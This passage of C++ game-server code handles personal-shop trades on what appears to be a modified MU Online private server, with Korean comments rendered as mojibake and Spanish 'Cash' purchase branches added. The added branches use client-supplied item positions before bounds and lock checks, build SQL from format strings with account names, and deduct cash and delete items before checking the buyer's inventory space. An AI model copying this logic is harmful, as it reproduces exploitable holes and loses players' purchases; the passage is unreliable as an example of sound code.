			pMsg.NumberL = LOBYTE( aIndex );
			memcpy(pMsg.btPShopText, lpMsg->szPShopText, MAX_PSHOP_TEXT);
			memcpy(pMsg.btName, gObj[aIndex].Name, MAX_IDSTRING);

			MsgSendV2(&gObj[aIndex], (LPBYTE)&pMsg, pMsg.h.size);

			LogAddTD("[PShop] [%s][%s] Personal Shop Already Opened - Changing PShop Name", 
				gObj[aIndex].AccountID,
				gObj[aIndex].Name
				);
		}
	}
	else {
		// ������ �������� ���Ѵ�.		
		CGPShopAnsOpen (aIndex, 0);
		return;
	}

	// ���� ���� ������ �˷���
	CGPShopAnsOpen (aIndex, 1);
}


//----------------------------------------------------------------------------
// SC [0x3F][0x02] ���λ��� ���� ���
VOID CGPShopAnsOpen (int aIndex, BYTE btResult)
{
	PMSG_ANS_PSHOP_OPEN pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x02, sizeof( pMsg ));
	pMsg.btResult = btResult;
	
	DataSend (aIndex, (LPBYTE) &pMsg, sizeof(PMSG_ANS_PSHOP_OPEN));
}


//----------------------------------------------------------------------------
// CS [0x3F][0x03] ���λ��� ���� ��û
VOID CGPShopReqClose (int aIndex)
{
	if (!gObjIsConnected(aIndex)) {
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d", aIndex);
		return;
	}

	if (gObj[aIndex].Type != OBJTYPE_CHARACTER) {
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]))
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3429), aIndex, 1);
		return;
	}

	if (g_NewPVP.IsObserver(gObj[aIndex]))
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3430), aIndex, 1);
		return;
	}
#endif  // ADD_NEWPVP_PKFIELD

	LogAddTD("[PShop] [%s][%s] Requested to Close PShop",
		gObj[aIndex].AccountID,
		gObj[aIndex].Name
		);

//	gObj[aIndex].m_IfState.use = 0;			// ���� �� ���¸� �ݴ´ٸ� �� ���� ��� ���ϴ� ���¿��� �ٸ� �͵��� ������ ���� �� �մ�.
//	gObj[aIndex].m_IfState.state = 0;
//	gObj[aIndex].m_IfState.type = 0;

	gObj[aIndex].m_bPShopOpen = false;
	memset (gObj[aIndex].m_szPShopText, 0, MAX_PSHOP_TEXT);
	
	CGPShopAnsClose (aIndex, TRUE);
}


//----------------------------------------------------------------------------
// SC [0x3F][0x03] ���λ��� ���� ���
VOID CGPShopAnsClose (int aIndex, BYTE btResult)
{
	LogAddTD("[PShop] [%s][%s] Close PShop",
		gObj[aIndex].AccountID,
		gObj[aIndex].Name
		);

	PMSG_ANS_PSHOP_CLOSE pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x03, sizeof( pMsg ));
	pMsg.btResult = btResult;
	pMsg.NumberH = HIBYTE(aIndex);
	pMsg.NumberL = LOBYTE(aIndex);
	
	DataSend (aIndex, (LPBYTE) &pMsg, sizeof(PMSG_ANS_PSHOP_CLOSE));
	
	if (btResult == 1)		// ���ᰡ ���������� ���� ���� �ִ� ����鿡�Ե� �����ش�.
		MsgSendV2(&gObj[aIndex], (LPBYTE)&pMsg, pMsg.h.size);
}


//----------------------------------------------------------------------------
// CS [0x3F][0x05] ���λ����� �����۸���Ʈ�� ��û (��»��)
VOID CGPShopReqBuyList (LPPMSG_REQ_BUYLIST_FROM_PSHOP lpMsg, int aSourceIndex)
{
	// aSourceIndex�� �ϰ� ����Ѵ�.
	if (gDoPShopOpen == 0) {
		return;
	}
	
	if (!gObjIsConnected(MAKEWORD(lpMsg->NumberL, lpMsg->NumberH))) {
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Seller did Not CONNECTED (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyList (aSourceIndex, -1, 2);					// ��� 2 : �������� �ʾ���
		return;
	}
	
	LPOBJECTSTRUCT lpObj = &gObj[MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)];
	if (lpObj->Type != OBJTYPE_CHARACTER) {
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Seller is Not CHARACTER (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyList (aSourceIndex, -1, 2);					// ��� 2 : �������� �ʾ���
		return;	
	}

#ifdef BUGFIX_PERSONALSHOP_ZENCOPY_20050426
	if (lpObj->CloseCount >= 0) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Closing (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);					// ��� 2 : �������� �ʾ���
		return;
	}
	
	if (gObj[aSourceIndex].CloseCount >= 0) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Buyer is Closing (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);					// ��� 2 : �������� �ʾ���
		return;
	}
#endif

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aSourceIndex]) )
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3429), aSourceIndex, 1);
		return;
	}

	if (g_NewPVP.IsObserver(gObj[aSourceIndex]))
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3430), aSourceIndex, 1);
		return;
	}
#endif  // ADD_NEWPVP_PKFIELD

	if (lpObj->m_Index == aSourceIndex) {
		// �ڽſ��� ���λ��� �ŷ��� ��û�ߴ�.
		LogAddTD("[PShop] [%s][%s] PShop List Requested to Him(/Her)Self",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name
			);
		CGPShopAnsBuyList (aSourceIndex, -1, 2);					// ��� 2 : �������� �ʾ���
		return;	
	}
	
	if (lpObj->m_bPShopOpen == false) {
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : [%s][%s] Did not Open PShop",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);
		CGPShopAnsBuyList (aSourceIndex, -1, 3);					// ��� 3 : ������ ���� ����
	}
	else {
		if( ((lpObj->Penalty&CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH) ||
			((lpObj->Penalty&CTLCODE_ACCOUNTITEMBLOCK) == CTLCODE_ACCOUNTITEMBLOCK)
			)
		{
			LogAddTD("[PShop] [%s][%s] PShop List Request Failed : [%s][%s] is in Item Block",
				gObj[aSourceIndex].AccountID,
				gObj[aSourceIndex].Name,
				lpObj->AccountID,
				lpObj->Name
				);
			CGPShopAnsBuyList (aSourceIndex, -1, 4);				// ��� 4 : �ش������ ������ �� �����̴�.
			return;
		}
		else {

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719			// ������ ���� ���� - �ٸ� ����� ���λ��� ������ ����� ��û�� ��
			if (gObjFixInventoryPointer(aSourceIndex) == false) {
				LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
			}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¶�� ���λ��� ����� ���� �� ����. (�޾Ƽ� �ŷ��� �� ��� ���� ���� �� ����)
			if (gObj[aSourceIndex].pTransaction == 1) {
				LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Requester Transaction == 1, IF_TYPE : %d",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					gObj[aSourceIndex].m_IfState.type
					);
				return;
			}
#endif

			// ���λ����� ������ �����Ƿ� ������ ����Ʈ�� �����ش�.
			LogAddTD("[PShop] [%s][%s] is Receiving PShop List From [%s][%s]",
				gObj[aSourceIndex].AccountID,
				gObj[aSourceIndex].Name,
				lpObj->AccountID,
				lpObj->Name
				);

			gObj[aSourceIndex].m_bPShopWantDeal = true;					// �ٸ������ ���λ��� â�� ���� �ִ�.
			gObj[aSourceIndex].m_iPShopDealerIndex = lpObj->m_Index;		
			memcpy (gObj[aSourceIndex].m_szPShopDealerName, lpObj->Name, MAX_IDSTRING);

			CGPShopAnsBuyList (aSourceIndex, lpObj->m_Index, true);
		}
	}
}


//----------------------------------------------------------------------------
// SC [0x3F][0x05] ���λ����� �����۸���Ʈ ����
VOID CGPShopAnsBuyList (int aSourceIndex, int aTargetIndex, BYTE btResult, bool bResend)
{
	// aSourceIndex�� aTargetIndex�� �ϰ� ����Ѵ�. (aTargetIndex�� ����ε� ���� �ƴҼ� ����)

	if (gDoPShopOpen == 0) {
		return;
	}

	PMSG_ANS_BUYLIST_FROM_PSHOP	pMsgILC;
	PMSG_BUYLIST_FROM_PSHOP		pMsgIL;
#ifdef ITEM_INDEX_EXTEND_20050706
	BYTE						sendBuf[1024];
#else
	BYTE						sendBuf[500];
#endif
	
	int							sOfs       = sizeof(pMsgILC);
	int							pMsgILSize = sizeof(pMsgIL);

	if (btResult != 1) {		// ����� ���� (1�� �ƴ�) ��� ��������� ����

		LPOBJECTSTRUCT	lpSourceObj = &gObj[aSourceIndex];

		pMsgILC.h.c			= 0xC2;
		pMsgILC.h.headcode	= 0x3F;
		if (bResend == false)
			pMsgILC.h.subcode	= 0x05;
		else
			pMsgILC.h.subcode	= 0x13;
		pMsgILC.h.sizeH		= HIBYTE( sOfs );
		pMsgILC.h.sizeL		= LOBYTE( sOfs );
		pMsgILC.btCount		= 0;
		pMsgILC.Result		= btResult;
		pMsgILC.NumberH		= HIBYTE( aTargetIndex );
		pMsgILC.NumberL		= LOBYTE( aTargetIndex );
		memset(pMsgILC.btName, 0, MAX_IDSTRING);
		memset(pMsgILC.szPShopText, 0, MAX_PSHOP_TEXT);
		memcpy( sendBuf, (char*)&pMsgILC, sizeof(pMsgILC));
		
		DataSend(aSourceIndex, (LPBYTE)sendBuf, sOfs);	
	}
	else {
		LPOBJECTSTRUCT	lpSourceObj = &gObj[aSourceIndex];
		LPOBJECTSTRUCT	lpTargetObj = &gObj[aTargetIndex];

		int itemcount=0;

		for( int n=MAX_INVENTORY; n<MAX_INVENTORY_EXTEND; n++)
		{
			if( lpTargetObj->Inventory1[n].IsItem() == TRUE )
			{
				pMsgIL.Pos = n;
				ItemByteConvert( pMsgIL.ItemInfo, lpTargetObj->Inventory1[n] );
				pMsgIL.PShopItemValue = lpTargetObj->Inventory1[n].m_iPShopValue;
				memcpy(sendBuf+sOfs, (char*)&pMsgIL, pMsgILSize);
				itemcount++;
				sOfs += pMsgILSize;

				LogAddTD("ITEM TYPE:%d", lpTargetObj->Inventory1[n].m_Type);
			}
		}
		
		pMsgILC.h.c				= 0xC2;
		pMsgILC.h.headcode		= 0x3F;
		if (bResend == false)
			pMsgILC.h.subcode	= 0x05;
		else
			pMsgILC.h.subcode	= 0x13;
		pMsgILC.h.sizeH			= HIBYTE( sOfs );
		pMsgILC.h.sizeL			= LOBYTE( sOfs );
		pMsgILC.btCount			= itemcount;
		pMsgILC.Result			= btResult;
		pMsgILC.NumberH			= HIBYTE( aTargetIndex );
		pMsgILC.NumberL			= LOBYTE( aTargetIndex );
		memcpy(pMsgILC.btName, lpTargetObj->Name, MAX_IDSTRING);
		memcpy(pMsgILC.szPShopText, lpTargetObj->m_szPShopText, MAX_PSHOP_TEXT);
		memcpy( sendBuf, (char*)&pMsgILC, sizeof(pMsgILC));

		DataSend(aSourceIndex, (LPBYTE)sendBuf, sOfs);	
	}
}


//----------------------------------------------------------------------------
// CS [0x3F][0x06] ���λ������� ������ �����ϰڴٰ� ��û


VOID CGPShopReqBuyItem (LPPMSG_REQ_BUYITEM_FROM_PSHOP lpMsg, int aSourceIndex)
{
	LPOBJECTSTRUCT lpObj = &gObj[MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)];
	// �߿�!!> . ���⼭�� �ʿ������� Ʈ������� �ʿ��ϴ�.

	//LPOBJECTSTRUCT lpObj = &gObj[MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)];
	int Golds = Manager.KCredits(gObj[aSourceIndex].AccountID);
	int pide = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;
	int NCPSHOP = Manager.Pshopnpc(lpObj->AccountID);
	GetPrivateProfileString("UPDATE OFFTRADE", "OFFTRADERESTA", "UPDATE MuOnline.dbo.MEMB_INFO SET Cash = Cash - %d WHERE memb___id = '%s'", g_GlobalConfig.OFFTRADERESTA, 200, CFG_QUERYSHOP);//SACA GOLDS
	GetPrivateProfileString("UPDATE OFFTRADE", "OFFTRADESUMA", "UPDATE MuOnline.dbo.MEMB_INFO SET Cash = Cash + %d WHERE memb___id = '%s'", g_GlobalConfig.OFFTRADESUMA, 200, CFG_QUERYSHOP);//SACA GOLDS
	
	if (NCPSHOP == 1)//parametro del comando offtrade
	{
		if (Golds < pide)
		{
			MsgOutput(aSourceIndex,"[BOT STORE] Necesitas %d Cash", lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue);
			MsgOutput(aSourceIndex,"[BOT STORE] Actualmente tienes  %d Cash", Golds);
			CGPShopAnsOpen(aSourceIndex, 0);
			return;
		}

		BYTE btNewItemPos = 0;
	    btNewItemPos = gObjOnlyInventoryInsertItem(aSourceIndex, lpObj->Inventory1[lpMsg->btItemPos]);//inventario lleno o no

		if (btNewItemPos == 0xFF)
	    {
		//Log.Inform("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] No Room to Buy Item", gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, lpObj->AccountID, lpObj->Name);
		CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

		return;
	    }

		Manager.ExecFormat(g_GlobalConfig.OFFTRADERESTA, pide, gObj[aSourceIndex].AccountID); // gObj lpObj
		Manager.ExecFormat(g_GlobalConfig.OFFTRADESUMA, pide, lpObj->AccountID);
		MsgOutput(aSourceIndex,"[BOT STORE] Te quedan %d Cash", Golds - pide);
		CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, btNewItemPos, 1);
		PShop.CGPShopReqBuyItemTest(lpMsg, aSourceIndex);

		return;
	}

	if (gDoPShopOpen == 0) 
	{
		return;
	}
	

	if (!gObjIsConnected(MAKEWORD(lpMsg->NumberL, lpMsg->NumberH))) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller did Not CONNECTED (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);			// ��� 2 : �������� �ʾ���
		return;
	}
	
	if (lpObj->Type != OBJTYPE_CHARACTER) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Not CHARACTER (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);			// ��� 2 : �������� �ʾ���
		return;	
	}

#ifdef BUGFIX_PERSONALSHOP_ZENCOPY_20050426
	if (lpObj->CloseCount >= 0) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Closing (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);			// ��� 2 : �������� �ʾ���
		return;
	}
	
	if (gObj[aSourceIndex].CloseCount >= 0) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Buyer is Closing (%d)",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			MAKEWORD(lpMsg->NumberL, lpMsg->NumberH)
			);
		CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);			// ��� 2 : �������� �ʾ���
		return;
	}
#endif

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aSourceIndex]) )
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3429), aSourceIndex, 1);
		return;
	}

	if (g_NewPVP.IsObserver(gObj[aSourceIndex]))
	{
		// "�����߿��� ���λ����� �̿��� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3430), aSourceIndex, 1);
		return;
	}
#endif  // ADD_NEWPVP_PKFIELD

	// ������ �����ߴ��� Ȯ��
	if (lpObj->m_bPShopOpen == false) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Did not Open PShop",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);

		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 3);		// ��� 3 : ������ ���� �ʾ���
		return;
	}

	// ���� ����� ����� �ɸ���� �´��� Ȯ��
	CHAR szName[MAX_IDSTRING + 1] = {0,};
	memcpy (szName, lpMsg->btName, sizeof(lpMsg->btName));
	szName[MAX_IDSTRING] = 0;
	if (strcmp(szName, lpObj->Name)) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Name Mismatch [%s] - [%s]",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			szName,
			lpObj->Name
			);

		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 6);		// ��� 6 : �������� �������� ����
		return;
	}

	// �������̸� ���λ����� ������ �� �� ����.
	if( lpObj->CloseType != -1 )
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is Closing Connection",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);

		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 2);		// ��� 2 : �������� �ʾ���
		return;
	}


	// ���� ������ �� �����̸� ������ �� �� ����.
	if( ((lpObj->Penalty&CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH) ||
		((lpObj->Penalty&CTLCODE_ACCOUNTITEMBLOCK) == CTLCODE_ACCOUNTITEMBLOCK)
		)
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is in Item Block",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);

		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 9);		// ��� 2 : ������ �� ���� ������ ��������
		return;
	}


	// ������ ������ �� �����̸� ������ �� �� ����.
	if( ((gObj[aSourceIndex].Penalty&CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH) ||
		((gObj[aSourceIndex].Penalty&CTLCODE_ACCOUNTITEMBLOCK) == CTLCODE_ACCOUNTITEMBLOCK)
		)
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] is in Item Block",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);

		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 9);		// ��� 2 : ������ �� ���� ������ ��������
		return;
	}


	// ���⼭ ���λ��� Ʈ������� Ȯ���Ѵ�.
	EnterCriticalSection(&lpObj->m_critPShopTrade);
	if (lpObj->m_bPShopTransaction == true) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Already Trade With Other",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			lpObj->AccountID,
			lpObj->Name
			);
		
		CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 4);		// ��� 4 : �ٸ� ����� �ŷ���
		LeaveCriticalSection(&lpObj->m_critPShopTrade);
		return;
	}
	else lpObj->m_bPShopTransaction = true;
	LeaveCriticalSection(&lpObj->m_critPShopTrade);

#ifdef ANTIHACKING_SERIAL_0_ITEM_20051202	
	if( gObjCheckSerial0ItemList(&lpObj->Inventory1[lpMsg->btItemPos]) )
	{
		// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
		MsgOutput( lpObj->m_Index, lMsg.Get(3354) );			// "����� �� �����ϴ�. �����Ϳ� �����ϼ���."
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aSourceIndex, (WORD)gObj[aSourceIndex].Life, 0xFD, 1, (WORD)gObj[aSourceIndex].iShield);
#else
		GCReFillSend(aSourceIndex, (WORD)gObj[aSourceIndex].Life, 0xFD, 1);
#endif
		LogAddTD("[ANTI-HACK][Serial 0 Item] [PShop Buy] (%s)(%s) Item(%s) Pos(%d)", 
			lpObj->AccountID, lpObj->Name, lpObj->Inventory1[lpMsg->btItemPos].GetName(), lpMsg->btItemPos);
		return;
	}
#endif

	// *> . ����/�Ǹ� ������� ������ �߿� ���� �������� ���� ������ Ȯ���Ѵ�.
#ifdef PERSONAL_SHOP_CHECK_COPYITEM_200406016
	if( gObjInventorySearchSerialNumber(&gObj[aSourceIndex], lpObj->Inventory1[lpMsg->btItemPos].GetNumber()) == FALSE )
	{
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aSourceIndex, (WORD)gObj[aSourceIndex].Life, 0xFD, 1, (WORD)gObj[aSourceIndex].iShield);
#else
		GCReFillSend(aSourceIndex, (WORD)gObj[aSourceIndex].Life, 0xFD, 1);
#endif
		LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, __FILE__, __LINE__);
		return;
	}

	if( gObjInventorySearchSerialNumber(lpObj, lpObj->Inventory1[lpMsg->btItemPos].GetNumber()) == FALSE )
	{
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(lpObj->m_Index, (WORD)lpObj->Life, 0xFD, 1, (WORD)lpObj->iShield);
#else
		GCReFillSend(lpObj->m_Index, (WORD)lpObj->Life, 0xFD, 1);
#endif
		LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", lpObj->AccountID, lpObj->Name, __FILE__, __LINE__);
		return;
	}
#endif


#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719			// ������ ���� ���� - �ٸ� ����� ���λ������� �������� ������ ��
	if (gObjFixInventoryPointer(aSourceIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¶�� ���λ��� �������� ������ �� ����. (Ʈ������� �ذ� �Ǿ�� ��)
	if (gObj[aSourceIndex].pTransaction == 1) {
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Requester Transaction == 1, IF_TYPE : %d",
			gObj[aSourceIndex].AccountID,
			gObj[aSourceIndex].Name,
			gObj[aSourceIndex].m_IfState.type
			);
		return;
	}
#endif

	// ������ �α׸� ����� ���� ����
	INT iITEM_LOG_TYPE		= 0;
	INT iITEM_LOG_LEVEL		= 0;
	INT iITEM_LOG_DUR		= 0;
	INT iITEM_LOG_SERIAL	= 0;


	__try {
		// ���λ����� ������ �����Ƿ� ���λ��� �������� �������� �����ϴ� �� Ȯ���ϰ� ���� ������ �Ǵ�.
		if (!CHECK_LIMIT(lpMsg->btItemPos-MAX_INVENTORY, MAX_INVENTORY_EXTEND - MAX_INVENTORY)) {
			// ������ ��ġ�� ���λ��� ��ġ�� ����Ƿ� ����
			CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 5);			// ��� 5 : ������ ��ġ�� �ε��� ����
			return;
		}

#ifdef MODIFY_ITEM_DUPLICATION_IN_MAPSERVER_MOVING_20051219
		// �ʼ��� �̵� ���̸� ���λ��� �ŷ� �� �� ����.
		if( lpObj->m_bMapSvrMoveQuit == true )
		{
			CGPShopAnsBuyItem (aSourceIndex, -1, 0, 2);			
			return;
		}
#endif

		if( lpObj->Inventory1[lpMsg->btItemPos].IsItem() == TRUE )
		{
			if (lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue <= 0) {
				// �ƾ����� ���������� ���ǰ��� ���� �������� �ʾ����Ƿ� ����
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Did Not Choose Item Price",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					lpObj->AccountID,
					lpObj->Name
					);
				CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 6);		// ��� 6 : �������� �������� ����
				return;	
			}
			
	if (lpObj->OffTradeCredits == 1)
    {
	int Golds = Manager.KCredits(gObj[aSourceIndex].AccountID);
	int pide = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;
	//int NCPSHOP = Manager.Pshopnpc(lpObj->AccountID);
	GetPrivateProfileString("UPDATE TIENDAPERSONAL", "TIENDAPERSONALRESTA", "UPDATE MuOnline.dbo.MEMB_INFO SET Cash = Cash - %d WHERE memb___id = '%s'", g_GlobalConfig.OFFTRADERESTA, 200, CFG_QUERYSHOP);//SACA GOLDS
	GetPrivateProfileString("UPDATE TIENDAPERSONAL", "TIENDAPERSONALSUMA", "UPDATE MuOnline.dbo.MEMB_INFO SET Cash = Cash + %d WHERE memb___id = '%s'", g_GlobalConfig.OFFTRADESUMA, 200, CFG_QUERYSHOP);//SACA GOLDS

	//-- STAR [Tienda Personal] PLAYERS
		if (Golds < pide)
		{
			MsgOutput(aSourceIndex,"[Tienda Personal] Necesitas %d Cash", lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue);
			MsgOutput(aSourceIndex,"[Tienda Personal] Actualmente tienes  %d Cash", Golds);
			CGPShopAnsOpen(aSourceIndex, 0);
			return;
		}

		Manager.ExecFormat(g_GlobalConfig.OFFTRADERESTA, pide, gObj[aSourceIndex].AccountID); 
		Manager.ExecFormat(g_GlobalConfig.OFFTRADESUMA, pide, lpObj->AccountID);
		MsgOutput(aSourceIndex,"[Tienda Personal] Te quedan %d Cash", Golds - pide);

			if (lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue <= 0) 
			{
				// �ƾ����� ���������� ���ǰ��� ���� �������� �ʾ����Ƿ� ����
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Did Not Choose Item Price",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					lpObj->AccountID,
					lpObj->Name
					);
				CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 6);		// ��� 6 : �������� �������� ����
				return;	
			}

			BYTE btNewItemPos = 0;
			btNewItemPos = ::gObjOnlyInventoryInsertItem(aSourceIndex, lpObj->Inventory1[lpMsg->btItemPos]);


			iITEM_LOG_TYPE		= lpObj->Inventory1[lpMsg->btItemPos].m_Type;
			iITEM_LOG_LEVEL		= lpObj->Inventory1[lpMsg->btItemPos].m_Level;
			iITEM_LOG_DUR		= lpObj->Inventory1[lpMsg->btItemPos].m_Durability;
			iITEM_LOG_SERIAL	= lpObj->Inventory1[lpMsg->btItemPos].m_Number;
			int precio = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;
			SQLCHAR CashLog[255] = { 0 };
		    wsprintf((char *)CashLog, "[COMPRA] Cuenta:[%s] Usuario:[%s] Compro por [%d] Cash [VENDEDOR] Cuenta:[%s] Usuario:[%s]", gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, precio, lpObj->AccountID, lpObj->Name );//GUARDA LOGS DEL CAMBIO DE GOLDS
		    LogSystem::CustomLogcash((char*)CashLog);//GUARDA LOGS DEL CAMBIO DE GOLDS
	        LogAddTD( "[COMPRA] Cuenta:[%s] Usuario:[%s] Compro por [%d] Cash [VENDEDOR] Cuenta:[%s] Usuario:[%s]", gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, precio, lpObj->AccountID, lpObj->Name );//GUARDA LOGS DEL CAMBIO DE GOLDS	
			
			gObjInventoryItemSet_PShop(lpObj->m_Index, lpMsg->btItemPos, 0xFF);
			lpObj->Inventory1[lpMsg->btItemPos].Clear();
			GCInventoryItemDeleteSend(lpObj->m_Index, lpMsg->btItemPos, 1);

			::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, btNewItemPos, 1);
			::CGPShopAnsSoldItem(lpObj->m_Index, aSourceIndex, lpMsg->btItemPos);

			if (btNewItemPos == 0xFF)
			{
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] No Room to Buy Item",
				gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
				lpObj->AccountID, lpObj->Name);
			    ::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

					return;
			}

		}
			else if(lpObj->OffTradeZen == 1)
				{
				if ( gObj[aSourceIndex].Money < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue )
				{
					LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of Zen",
						gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
						lpObj->AccountID, lpObj->Name);
